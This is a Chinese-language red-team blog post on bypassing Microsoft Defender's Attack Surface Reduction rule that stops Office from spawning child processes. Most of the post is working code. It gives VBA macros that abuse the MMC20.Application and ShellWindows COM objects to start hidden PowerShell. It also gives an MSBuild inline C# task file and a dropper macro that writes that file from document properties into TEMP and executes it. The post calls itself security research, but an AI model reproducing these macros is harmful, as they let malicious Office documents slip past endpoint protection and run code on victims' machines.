---
title: 红蓝对抗-Office ASR绕过
date: 2022-10-30
categories: [红蓝对抗]
tags: [红蓝对抗, Windows, ASR, Bypass]
---

## 0X00 什么是ASR

[Attack Surface Reduction](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction)(**ASR**)是微软推出一组**Windows defender**强化配置，旨在减缓攻击者常用的攻击技术。**ASR**规则在**LUA**中实现，并由**Windows Defender**执行。它们具体如下：

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/asr.png)

更加详细的细节可以在这个地方查看[https://learn.microsoft.com/zh-cn/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide](https://learn.microsoft.com/zh-cn/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)(当然也可以点段首的加粗字体跳转)

 这些规则中的许多规则可以组合使用，当然我们可以单独绕过某一规则，但它仍然有可能被另一规则所阻止。本文演示的是在**Office**下的绕过。 

## 0x01 Block Office Processes

这个规则即阻止所有**Office**应用程序创建子进程，这包括**Word**、**Excel**、**PowerPoint**、**OneNote**和**Access**

在我们创建生成宏文档并让他运行**PowerShell** **payload**的时候，一般是下面的代码

```vb
Sub Asr()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell"
    Set wsh = Nothing
End Sub
```

但是这样容易被**Windows**本身的**defender**发现并把他无情的查杀。

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/defender.png)

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/defender2.png)

## 0x02  COM Bypass

解决这个问题的一种方法是使用**COM**，我们可以直接从**VBA**实例化一个**COM**对象来达到绕过ASR的查杀的目的。因此我们可以考虑利用那些我们知道会导致代码执行的对象。然而并不是每个**COM**对象都可以进行代码执行，只有设置**LocalServer32**，以便进程具有不是**Office**应用程序的父进程才可以。例如，**MMC20.Application**对象会使用**mmc.exe**作为父进程，而**ShellWindows**和**ShellBrowserWindow**的**ShellExecute**方法都将使用**explorer.exe** 作为父进程。
下面是一个使用**MMC20**的方法： 

```vb
Sub Asr()
    Dim mmc As Object
    Set mmc = CreateObject("MMC20.Application")
    mmc.Document.ActiveView.ExecuteShellCommand "powershell", "", "", "7"
    Set mmc = Nothing
End Sub
```

**mmc.exe**会马上关闭，从而生成没有父进程的**PowerShell**

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/ps.png)

下面是使用**ShellWindows**的方法：

```vb
Sub Asr()
    Dim com As Object
    Set com = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    com.Item.Document.Application.ShellExecute "powershell", "", "", Null, 0
    Set com = Nothing
End Sub
```

与之前的相比，这个会生成一个隐藏的**PowerShell**进程，并且它将会作为**explorer.exe**的子进程运行。就之前的方法来说，这种方法提高了隐蔽性。

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/ps2.png)

## 0x03  LOLBAS

ASR规则实际上是基于某种黑名单的来实现的，我们可以尝试打开一个记事本来验证我们的猜想。

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/notepad.png)

**Windows defender**没有拦截，所以我们上述的想法成立。

因此我们可以大胆猜测这里可能会有使用基于命令行的执行的办法，笔者在这里使用了[LOLBAS项目](https://lolbas-project.github.io/#)，经过简单的测试，发现**[MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)**没有被拦截(其他的可以自行测试)。

[MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)可以从.xml或.csproj文件执行内联C#代码。可以在这里去查看**MSBuild**的结构[[MSBuild 项目文件架构引用 - MSBuild | Microsoft Learn](https://learn.microsoft.com/zh-cn/visualstudio/msbuild/msbuild-project-file-schema-reference?view=vs-2022)]

我们可以通过以下方法去实现：

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="MSBuild">
<ASRSucks /> 
</Target> 
<UsingTask
  TaskName="ASRSucks"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Code Type="Class" Language="cs">
    <![CDATA[
      using System;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;

      public class ASRSucks : Task, ITask
      {         
        public override bool Execute()
        {
            Console.WriteLine("tested by 二两");
            return true;
        } 
      }     
    ]]>
    </Code>
  </Task>
 </UsingTask>
</Project>
```

我们可以通过这种方式去运行

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe test.xml
```

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/xml.png)

那么接下来就是怎么去利用word宏去执行我们的恶意代码，我们可以将xml提前放在电脑的某个位置(例如temp目录，然后通过宏执行)

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="MSBuild">
<ASRSucks /> 
</Target> 
<UsingTask
  TaskName="ASRSucks"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Code Type="Class" Language="cs">
    <![CDATA[
      using System.Diagnostics;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;

      public class ASRSucks : Task, ITask
      {         
        public override bool Execute()
        {
            Process.Start("powershell");
            return true;
        } 
      }     
    ]]>
    </Code>
  </Task>
 </UsingTask>
</Project>
```

```vb
Sub Asr()
    Dim comment As String
    Dim wsh As Object
    Dim temp As String
    Dim command As String
    
    temp = LCase(Environ("TEMP"))
    comment = ActiveDocument.BuiltInDocumentProperties("Comments").Value
    Set wsh = CreateObject("WScript.Shell")
    command = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe " & temp & "\test.xml"
    wsh.Run command
End Sub

```

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/ps3.png)

当然，这些代码会一直保持在temp目录下面，我们可以增加一点东西把它删除

```vb
Sub Asr()
    Dim comment As String
    Dim fSo As Object
    Dim dropper As Object
    Dim wsh As Object
    Dim temp As String
    Dim command As String
    
    temp = LCase(Environ("TEMP"))
    
    Set fSo = CreateObject("Scripting.FileSystemObject")
    Set dropper = fSo.CreateTextFile(temp & "\test.xml", True)
    
    comment = ActiveDocument.BuiltInDocumentProperties("Comments").Value
    
    dropper.WriteLine comment
    dropper.Close
    
    Set wsh = CreateObject("WScript.Shell")
    
    command = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe " & temp & "\test.xml"
    
    wsh.Run command
    
    Set fSo = Nothing
    Set dropper = Nothing
    Set wsh = Nothing
End Sub
```

![](https://raw.githubusercontent.com/ring0rl/blog_pic/main/2022-10-30/res.png)

## 0x04 小结

本文介绍了在ASR规则下，Office在执行宏中的绕过。当然以上有些方法在不同版本的Windows中处理生成也会有所不同，具体的不同可以去自行测试。

### 注：本文仅用于安全研究和学习之用